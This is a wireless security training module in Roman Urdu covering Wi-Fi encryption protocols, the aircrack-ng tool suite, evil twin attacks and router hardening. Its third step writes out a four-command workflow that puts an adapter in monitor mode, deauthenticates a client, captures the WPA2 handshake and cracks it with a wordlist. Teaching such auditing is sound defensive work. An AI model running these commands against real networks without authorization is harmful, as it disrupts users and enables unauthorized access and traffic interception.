Module 5: Wireless Network Hacking & Defense

Wireless Security mein hum Wi-Fi networks (Routers/Access Points) ki security vulnerabilities audit karna aur wireless signals ko unauthorized interception se bachana seekhte hain.

📡 Step 1: Wireless Security Protocols (WEP, WPA, WPA2, WPA3)
Wi-Fi networks ko secure karne ke liye waqt ke sath mukhtalif encryption protocols banaye gaye:
  • WEP (Wired Equivalent Privacy): Sab se purana aur Intehai kamzor protocol. Minton mein hack ho jata hai.
  • WPA / WPA2 (Wi-Fi Protected Access): Ziada tar gharon aur offices mein istemal hone wala standard protocol.
  • WPA3: Naya aur highly secure protocol jo dictionary attacks se protection deta hai.
🛠️ Step 2: Wireless Hacking Tools (Aircrack-ng Suite)
Wireless auditing ke liye Kali Linux mein mashhoor tools ka suite istemal hota hai:
  • Airmon-ng: Wi-Fi Card ko Normal Mode se Monitor Mode mein convert karta hai taake hawa mein maujood tamaam packets capture ho sakein.
  • Airodump-ng: Nearby Wi-Fi Routers, unke MAC Addresses (BSSID), aur channels ko scan/record karta hai.
  • Aireplay-ng: Deauthentication packets bhej kar connected devices ko router se disconnect (kick) karta hai.
  • Aircrack-ng: Captured 4-Way Handshake packets par dictionary attacks chala kar password crack karta hai.
⚡ Step 3: WPA2 Handshake Capture Process
WPA2 Wi-Fi Networks ko test karne ka 4-step practical workflow:
# 1. Wi-Fi Adapter Ko Monitor Mode Mein Lana
airmon-ng start wlan0

# 2. Target Wi-Fi Router Ka Traffic Record Karna
airodump-ng --bssid [ROUTER_MAC] -c [CHANNEL] -w capture_file wlan0mon

# 3. Target User Ko Disconnect Karke 4-Way Handshake Capture Karna
aireplay-ng --deauth 10 -a [ROUTER_MAC] -c [CLIENT_MAC] wlan0mon

# 4. Captured Handshake Par Wordlist Attack Chalana
aircrack-ng -w wordlist.txt capture_file.cap
😈 Step 4: Rogue AP & Evil Twin Attacks
Is attack mein hacker bilkul target router jesa naqli Access Point (Wi-Fi) banata hai:
  • Evil Twin: Same Wi-Fi name (SSID) bana kar asal router ko jam kar diya jata hai. Users automatic naqli Wi-Fi se connect ho jate hain aur unka sensitive traffic capture ho jata hai.
🛡️ Step 5: Wi-Fi Defense & Security Hardening
Apne Wi-Fi Router ko wireless attacks se bachane ke zaroori steps:
  • Disable WPS: Router settings mein WPS (Wi-Fi Protected Setup) ko hamesha OFF rakhein.
  • Use Strong Encryption: Minimum WPA2-AES ya WPA3 Encryption mode select karein.
  • Strong Passwords: Passwords mein Numbers, Symbols, aur Upper/Lower case letters istemal karein.
  • Router Firmware Updates: Router ke software ko regular basis par update rakhein.
